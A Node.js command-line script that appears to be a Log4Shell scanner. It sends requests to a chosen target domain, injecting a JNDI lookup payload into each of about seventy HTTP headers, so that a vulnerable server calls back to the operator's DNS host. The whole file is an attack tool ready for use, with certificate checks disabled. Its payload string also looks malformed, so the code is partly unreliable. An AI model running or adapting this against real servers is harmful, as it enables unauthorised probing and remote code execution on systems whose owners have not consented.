import got from "got";
import { HttpsProxyAgent } from "hpagent";
import { Command } from 'commander';

///////////////////////////////////////////////////////////////
const program = new Command();
program
  .requiredOption('-t, --target <type>', 'The target domain')
  .requiredOption('-c, --callbackDNS <type>', 'Your callback dns server')
  .option('-q, --query <type>', 'GET query')
  .option('--timeout <type>', 'Query timeout', "30000")
  .option('--jndi <type>', 'Use a custom jndi payload', "jndi:ldap")

program.parse(process.argv);

const options = program.opts();
console.log("------------------------------------------------------")
if (options.target) { console.log(`[Target]: ${program.opts().target}`); };
if (options.callbackDNS) { console.log(`[Callbackdns]: ${program.opts().callbackDNS}`); };
if (options.query) { console.log(`[Query]: ${program.opts().query}`); };
if (options.timeout) { console.log(`[Timeout]: ${program.opts().timeout}`); };
if (options.jndi) { console.log(`[Jndi]: ${program.opts().jndi}`); };
console.log("------------------------------------------------------")
console.log("")
///////////////////////////////////////////////////////////////

const agentConfig = new HttpsProxyAgent({
  keepAlive: true,
  keepAliveMsecs: 1000,
  maxSockets: 256,
  maxFreeSockets: 256,
  scheduling: "lifo",
  proxy: "http://192.168.0.150:8080",
});

const headersList = ["Referer","X-Api-Version","Accept-Charset","Accept-Datetime","Accept-Encoding","Accept-Language","Cookie","Forwarded","Forwarded-For","Forwarded-For-Ip","Forwarded-Proto","From","TE","True-Client-IP","Upgrade","User-Agent","Via","Warning","X-Api-Version","Max-Forwards","Origin","Pragma","DNT","Cache-Control","X-Att-Deviceid","X-ATT-DeviceId","X-Correlation-ID","X-Csrf-Token","X-CSRFToken","X-Do-Not-Track","X-Foo","X-Foo-Bar","X-Forwarded","X-Forwarded-By","X-Forwarded-For","X-Forwarded-For-Original","X-Forwarded-Host","X-Forwarded-Port","X-Forwarded-Proto","X-Forwarded-Protocol","X-Forwarded-Scheme","X-Forwarded-Server","X-Forwarded-Ssl","X-Forwarder-For","X-Forward-For","X-Forward-Proto","X-Frame-Options","X-From","X-Geoip-Country","X-Http-Destinationurl","X-Http-Host-Override","X-Http-Method","X-Http-Method-Override","X-HTTP-Method-Override","X-Http-Path-Override","X-Https","X-Htx-Agent","X-Hub-Signature","X-If-Unmodified-Since","X-Imbo-Test-Config","X-Insight","X-Ip","X-Ip-Trail","X-ProxyUser-Ip","X-Requested-With","X-Request-ID","X-UIDH","X-Wap-Profile","X-XSRF-TOKEN"]

for (let header of headersList) {
  let url = program.opts().target;
  let payload = "${:"+program.opts().jndi+"//"+header+"."+program.opts().callbackDNS+"}";
  let h = {[header]: payload};

  if (options.query){
    url = `${program.opts().target}${program.opts().query}`
  }

  if (options.query){
    url = `${program.opts().target}${program.opts().query}`
  }

  //console.log(`url: ${url} || payload: ${header}`);
  await sendRequest(url, h);
};

async function sendRequest(url, myheaders){
  try {
    let response = await got(url, {
      timeout: {
        request: program.opts().timeout,
      },
      //responseType: "json",
      headers: myheaders,
      https: { rejectUnauthorized: false },
      //agent: { https: agentConfig },
      retry: { limit: 3, methods: ["GET", "POST"] },
    });
    
    console.log(`[${response.statusCode}]: ${url} || Body length: ${response.body.length}`);    
  } catch (err) {
    console.log(`[${err.code}]: ${url} || headerDebug: ${JSON.stringify(myheaders)}`);
    //console.log("[-] error: " + err);
  }
  
}
